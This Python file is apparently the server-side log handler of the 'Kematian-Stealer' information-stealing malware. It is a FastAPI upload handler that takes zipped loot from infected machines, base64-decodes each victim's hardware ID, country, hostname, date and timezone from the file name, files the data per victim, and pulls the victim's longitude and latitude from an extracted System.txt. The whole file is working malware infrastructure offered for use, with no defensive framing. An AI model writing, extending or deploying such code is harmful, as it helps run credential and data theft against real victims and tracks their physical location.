import os
import base64
import zipfile
import logging

from fastapi import File, UploadFile, HTTPException


class LogHandler:
    def __init__(self, file: UploadFile = File(...)) -> None:
        """Initializes the LogHandler class.

        Args:
            file (UploadFile, optional): File that has been uploaded to the server. Defaults to File(...).

        Raises:
            HTTPException: Raised if the file name is not in the correct format.
        """
        self.file = file
        self.KDOT_STEALER_DIR = os.path.join(
            os.getenv("APPDATA"), "Kematian-Stealer", "logs"
        )
        self.file_name = file.filename

        try:
            # fmt: off
            self.file_name_no_ext = self.file_name.split(".")[0]
            self.file_hwid = self.decode_info(self.file_name_no_ext.split("_")[0])
            self.file_country_code = self.decode_info(self.file_name_no_ext.split("_")[1])
            self.file_hostname = self.decode_info(self.file_name_no_ext.split("_")[2])
            self.file_date = self.decode_info(self.file_name_no_ext.split("_")[3])
            self.file_timezone = self.decode_info(self.file_name_no_ext.split("_")[4])
            # fmt: on
        except Exception as e:
            logging.error(f"Error parsing file name: {e}")
            raise HTTPException("KDot227 on github lmfao")

        self.HWID_folder_dir = os.path.join(self.KDOT_STEALER_DIR, self.file_hwid)
        self.HWID_path_expected = os.path.join(self.HWID_folder_dir, self.file_name)
        self.extracted_folder_name = ""

        logging.info(f"LogHandler initialized with file: {self.file_name}")

    def read_file(self) -> bytes:
        """Reads the file and returns the contents.

        Returns:
            bytes: Bytes of the file.
        """
        with open(self.HWID_path_expected, "rb") as f:
            return f.read()

    def get_file_info(self) -> dict:
        """Gets the file information.

        Returns:
            dict: Returns the file information as a dict.
        """
        return {
            "hwid": self.file_hwid,
            "country_code": self.file_country_code,
            "hostname": self.file_hostname,
            "date": self.file_date,
            "timezone": self.file_timezone,
        }

    def decode_info(self, input_text: str) -> str:
        """Base64 decodes the input text.

        Args:
            input_text (str): Text to be decoded.

        Returns:
            str: Returns the decoded text.
        """
        return base64.b64decode(input_text).decode("utf-8")

    def unzip_file(self) -> bool:
        """Unzips the file and extracts it to the correct directory.

        Returns:
            bool: Returns True if the file was unzipped successfully, otherwise False.
        """
        try:
            os.makedirs(self.HWID_folder_dir, exist_ok=True)
            with open(self.HWID_path_expected, "wb") as f:
                # file.file isn't confusing at all
                f.write(self.file.file.read())
            with open(self.HWID_path_expected, "rb") as f:
                with zipfile.ZipFile(f, "r") as zip_ref:
                    zip_ref.extractall(self.HWID_folder_dir)
                    self.extracted_folder_name = zip_ref.namelist()[0].split("/")[0]
            os.remove(self.HWID_path_expected)
        except Exception as e:
            logging.critical(
                f"Error unzipping file: {e} YOU ARE MOST LIKELY BEING WATCHED!!!"
            )
            return False
        return True

    def get_longitude_latitude(self) -> tuple:
        """Gets the longitude and latitude of the location.

        Returns:
            tuple: Returns the longitude and latitude of the location.
        """

        with open(
            os.path.join(
                self.HWID_folder_dir,
                self.extracted_folder_name,
                "System.txt",
            ),
            "r",
            encoding="utf-8",
            errors="ignore",
        ) as f:
            lines = f.readlines()
            for line in lines:
                if "Longitude" in line:
                    longitude = line.split(":")[1].strip()
                if "Latitude" in line:
                    latitude = line.split(":")[1].strip()
        return longitude, latitude
